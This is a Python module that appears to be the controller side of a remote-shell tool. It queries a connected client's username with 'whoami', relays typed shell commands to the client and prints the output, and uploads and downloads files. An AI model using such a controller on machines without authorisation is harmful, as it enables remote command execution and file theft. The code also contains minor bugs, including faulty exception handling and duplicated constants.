#!/bin/python3
'''
Author: Gal Davidi
'''

import os
import logging
import logging.config
import fileReader
import hashlib

import logger

BUFFER = 1024
END_MSG = b'exit'
CODING = "utf-8"
CONN_TEST = b' '
BIG_BUFFER = 65536
TRUE = 1
FALSE = 0
BACK_TO_STRESS = 'back'
USERNAME_CMD = b'whoami'
LOGGER_CONF_PATH = "conf/logger.conf"
GET_FILE_TRIGER = b'get'
PUT_FILE_TRIGER = b'put'
END_MSG = 'exit'
BACK_TO_STRESS = b'back'

def get_client_username(connection):
    '''
    get username using the 'whoami' command
    '''
    try:
        connection.sendall(USERNAME_CMD)
        username = connection.recv(BUFFER).decode(CODING)
        return username
    except OSError or ConnectionError as err:
        logger.logger_build(f"{err}", 'error')
        return "unknown"


def command_sender(connection, client_name):
    '''
    send command to the client
    '''
    while True:
        try:
            command = input(f"{client_name}$").encode(CODING)
            logger.logger_build(f"{command.decode(CODING)}", 'info', client_name)
            if command == BACK_TO_STRESS:
                break
            connection.sendall(command)
            data = connection.recv(BUFFER)
            print(f'{data.decode(CODING)}', end='')
            logger.logger_build(f"{data.decode(CODING)}", 'info', client_name)
        except ConnectionResetError as err:
            logger.logger_build(f"{err}", 'error', client_name)


def put_file(remote_path, local_path, connection):
    '''upload file to the client'''
    try:
        connection.send(PUT_FILE_TRIGER)
        connection.send(remote_path.encode(CODING))
        with open(local_path, 'rb') as file:
            data = file.read(BUFFER)
            while data:
                connection.send(data)
                data = file.read(BUFFER)
        connection.send(b'eof')
        return
    except OSError or ConnectionError as err:
        logger.logger_build(f"{err}", 'error')


def get_file(local_path, remote_path, connection):
    '''get file from the client'''
    try:
        connection.send(GET_FILE_TRIGER)
        connection.send(remote_path.encode(CODING))
        with open(local_path, 'wb') as file:
            while True:
                data = connection.recv(BUFFER)
                print(data.decode(CODING))
                if data == 'eof'.encode(CODING):
                    break
                file.write(data)
            return
    except OSError or ConnectionError as err:
        logger.logger_build(f"{err}", 'error')
